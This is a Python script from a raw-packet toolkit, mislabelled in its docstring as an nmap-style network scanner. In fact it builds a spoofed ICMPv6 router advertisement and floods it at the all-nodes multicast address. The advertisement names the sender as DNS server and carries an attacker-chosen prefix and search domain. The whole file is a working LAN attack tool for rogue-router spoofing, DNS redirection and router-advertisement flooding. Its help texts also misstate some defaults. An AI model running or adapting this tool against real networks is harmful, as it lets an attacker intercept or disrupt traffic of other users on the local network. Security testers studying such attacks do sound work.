#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
nmap_scanner.py: Scan local network
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Utils.network import ICMPv6_raw, Ethernet_raw
# endregion

# region Import libraries
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from sys import stdout
from time import sleep
from traceback import format_exc
from datetime import datetime
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Stable'
# endregion

# region Main function
if __name__ == "__main__":

    # region Check user, platform and print banner
    Base = Base()
    Base.check_platform()
    Base.check_user()
    Base.print_banner()
    # endregion

    # region Parse script arguments
    parser = ArgumentParser(description='ICMPv6 router advertisement packets sender')

    parser.add_argument('-i', '--interface', type=str, help='Set interface name for send TCP packets')

    parser.add_argument('-m', '--src_mac', type=str, help='Set src mac address (not required)', default=None)
    parser.add_argument('-M', '--dst_mac', type=str, help='Set dst mac address (not required)', default=None)
    parser.add_argument('-a', '--src_ipv6', type=str, help='Set src ipv6 address (not required)', default=None)
    parser.add_argument('-A', '--dst_ipv6', type=str, help='Set dst ipv6 address (not required)', default=None)

    parser.add_argument('-d', '--dns', type=str, help='Set DNS IPv6 address (not required)', default=None)
    parser.add_argument('-D', '--domain', type=str, help='Set domain search (default: test.com)', default="test.com")
    parser.add_argument('-P', '--prefix', type=str, help='Set network prefix (default: fd00::/64)', default="fd00::/64")

    parser.add_argument('-p', '--number_of_packets', type=int, help='Set number of packets (default=100000)', default=10000)
    parser.add_argument('-t', '--number_of_iterations', type=int, help='Set number of iteration (default=100)', default=100)

    parser.add_argument('--delay', type=float, help='Set delay between packets (default=0.0)', default=0.0)

    args = parser.parse_args()
    # endregion

    # region Variables
    icmpv6 = ICMPv6_raw()
    eth = Ethernet_raw()

    SOCK = None

    iteration = 0
    index = 0
    # endregion

    # region Get network settings

    # region Set network interface
    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface
    # endregion

    # region Set source MAC address
    if args.src_mac is None:
        src_mac_address = Base.get_netiface_mac_address(current_network_interface)
    else:
        src_mac_address = args.src_mac
    # endregion

    # region Set destination MAC address
    if args.dst_mac is None:
        dst_mac_address = "33:33:00:00:00:01"  # IPv6mcast
    else:
        dst_mac_address = args.dst_mac
    # endregion

    # region Set source IPv6 address
    if args.src_ipv6 is None:
        src_ipv6_address = Base.get_netiface_ipv6_link_address(current_network_interface)
    else:
        src_ipv6_address = args.src_ipv6
    # endregion

    # region Set destination IPv6 address
    if args.dst_ipv6 is None:
        dst_ipv6_address = "ff02::1"
    else:
        dst_ipv6_address = args.dst_ipv6
    # endregion

    # region Set DNS server address
    if args.dns is None:
        dns_ipv6_address = Base.get_netiface_ipv6_link_address(current_network_interface)
    else:
        dns_ipv6_address = args.dns
    # endregion

    # endregion

    # region General output
    Base.print_info("Interface: ", current_network_interface)
    Base.print_info("Src IPv6 address: ", src_ipv6_address)
    Base.print_info("Dst IPv6 address: ", dst_ipv6_address)
    Base.print_info("Src MAC address: ", src_mac_address)
    Base.print_info("Dst MAC address: ", dst_mac_address)
    Base.print_info("Prefix: ", args.domain)
    Base.print_info("DNS IPv6 address: ", dns_ipv6_address)
    Base.print_info("Domain search: ", args.domain)
    Base.print_info("Sending ICMPv6 router advertisement packets ...")

    start_time = datetime.now()
    Base.print_info("Start sending time: ", str(start_time))
    # endregion

    # region Send ICMPv6 RA packets
    try:

        # Create raw socket
        SOCK = socket(AF_PACKET, SOCK_RAW)
        SOCK.bind((current_network_interface, 0))

        # Make ICMPv6 RA packet
        ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=src_mac_address,
                                                            ethernet_dst_mac=dst_mac_address,
                                                            ipv6_src=src_ipv6_address,
                                                            ipv6_dst=dst_ipv6_address,
                                                            dns_address=dns_ipv6_address,
                                                            domain_search=args.domain,
                                                            prefix=args.prefix)

        # Send ICMPv6 RA packets in cycle
        for iteration in range(args.number_of_iterations):
            progress_percent = int((iteration / args.number_of_iterations) * 100) + 1
            stdout.write('\r')
            stdout.write(Base.c_info + 'Progress: ' + Base.cINFO + str(progress_percent) + '%' + Base.cEND)
            stdout.flush()
            index = 0
            while index < args.number_of_packets:
                SOCK.send(ra_packet)
                index += 1
                sleep(args.delay)

    # Keyboard interrupt
    except KeyboardInterrupt:
        pass

    # Any exceptions
    except:
        stdout.write('\n')

        Base.print_info("End sending time: ", str(datetime.now()))
        Base.print_error("Do not send ICMPv6 router advertisement packets!")
        Base.print_info(str(format_exc()))
        Base.print_info("Close socket and exit ...")

        if SOCK is not None:
            SOCK.close()
        exit(1)

    # endregion

    # region Calculate send speed
    end_time = datetime.now()
    number_of_packets = (int(iteration)*int(args.number_of_packets)) + index
    speed = float('{:.3f}'.format(number_of_packets / (end_time - start_time).total_seconds()))
    # endregion

    # region Output script results
    stdout.write('\n')
    Base.print_info("End sending time: ", str(end_time))
    Base.print_info("Send: ", str(number_of_packets), " ICMPv6 router advertisement packets!")
    Base.print_info("Speed: ", str(speed), " pkt/s")
    Base.print_info("Close socket and exit ...")
    # endregion

    # region Close raw socket and exit
    SOCK.close()
    exit(0)
    # endregion

# endregion
